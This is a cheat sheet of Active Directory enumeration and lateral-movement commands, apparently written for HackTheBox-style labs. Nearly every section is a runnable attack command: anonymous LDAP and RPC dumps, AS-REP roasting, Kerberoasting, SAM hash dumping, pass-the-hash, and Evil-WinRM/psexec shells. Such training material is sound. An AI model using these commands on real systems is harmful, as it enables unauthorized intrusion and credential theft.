> [!note] Cheat Sheet: Reconnaissance and Advancement v2.0 (Enumeration & Lateral Movement) #enumeration #lateral-movement #activedirectory #smb #ldap #kerberos

### 1. SMBclient & SMBmap (Manual Share Exploration)

Sometimes the automated system misses hidden files. `smbclient` works like FTP, but for Windows.

Connect to a specific share (folder) without a password:
```
smbclient //10.10.10.10/ShareName -N
```

Connect with login and password:
```
smbclient //10.10.10.10/ShareName -U admin
```

Quick check of all shares and their access rights (read/write):
```
smbmap -H 10.10.10.10 -u 'admin' -p 'password123'
```

### 2. RPCclient (Reconnaissance via port 135/445)

If you can't access SMB shares, but RPC (Null Session) allows access, you can get a list of all users and groups here.

Connecting without a password (Null Session):
```
rpcclient -U "" -N 10.10.10.10
```

> [!tip] Commands inside rpcclient: `enumdomusers` — list users. `enumprivs` — view privileges. `querydispinfo` — detailed information (names, descriptions).

### 3. LDAPsearch (Active Directory Reconnaissance, port 389)

The most powerful way to dump the entire domain structure, if LDAP allows anonymous reading (or at least some account exists).

Anonymous dump of the entire domain (requires knowing the domain name, for example, dc=htb,dc=local):
```
ldapsearch -x -H ldap://10.10.10.10 -b "dc=htb,dc=local"
```

Extract only the names of all users from LDAP:
```
ldapsearch -x -H ldap://10.10.10.10 -b "dc=htb,dc=local" | grep sAMAccountName
```

### 4. Kerbrute (Kerberos Reconnaissance, port 88)

Does not lock accounts. Ideal for validating user lists found on a website or in documents.

Checking which users from the dictionary actually exist in the domain:
```
kerbrute userenum -d target.local --dc 10.10.10.10 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

### 5. Kerberos Vulnerabilities (Impacket)

The basis of medium-sized HTB machines. If you find live users, immediately check these two attacks.

**AS-REPRoasting** (Getting the password hash of a user with preauthentication disabled):
```
impacket-GetNPUsers target.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt -dc-ip 10.10.10.10
```

**Kerberoasting** (Requesting a Service Ticket for service accounts to brute-force the hash). Needs the login and password of ANY user:
```
impacket-GetUserSPNs target.local/admin:password123 -request -dc-ip 10.10.10.10
```

### 6. BloodHound (Active Directory Graph Collection)

When there are too many users and groups, BloodHound will show a visual path: how to obtain a Domain Admin account from a regular user.

Data collection (run via the Python version of Sharphound on your Kali):
```
python3 /opt/BloodHound.py/bloodhound.py -c All -u admin -p password123 -d target.local -dc 10.10.10.10
```

> This will create a .zip archive, which you need to drag into the BloodHound GUI.

### 7. xFreeRDP (GUI, port 3389)

If you've found the password and RDP is open, it's better to log in graphically (especially if the command line is filtered).

Connecting to RDP with screen resizing (`/dynamic-resolution`):
```
xfreerdp /v:10.10.10.10 /u:admin /p:password123 /dynamic-resolution
```

Forwarding a local folder to the remote desktop (to upload linpeas/winpeas):
```
xfreerdp /v:10.10.10.10 /u:admin /p:password123 /drive:share,/root/Downloads
```

### 8. NetExec (nxc) — (The Essential Swiss Army Knife)

Credential Verification:
```
nxc smb 10.10.10.10 -u 'admin' -p 'password123'
```

Pass-the-Hash (access verification using the NTLM hash if the password is missing) no):
```
nxc smb 10.10.10.10 -u 'admin' -H 'aad3b435b51404eeaad3b435b51404ee:NTLM_HASH'
```

Dump local hashes from the machine (requires Pwn3d!):
```
nxc smb 10.10.10.10 -u 'admin' -p 'password123' --sam
```

### 9. Evil-WinRM / Impacket-psexec (Getting a shell)

Evil-WinRM (Connecting via WinRM, port 5985):
```
evil-winrm -i 10.10.10.10 -u 'admin' -p 'password123'
```

Impacket psexec (System shell on port 445 by hash - Pass-the-Hash):
```
impacket-psexec -hashes :NTLM_HESH target.local/admin@10.10.10.10
```
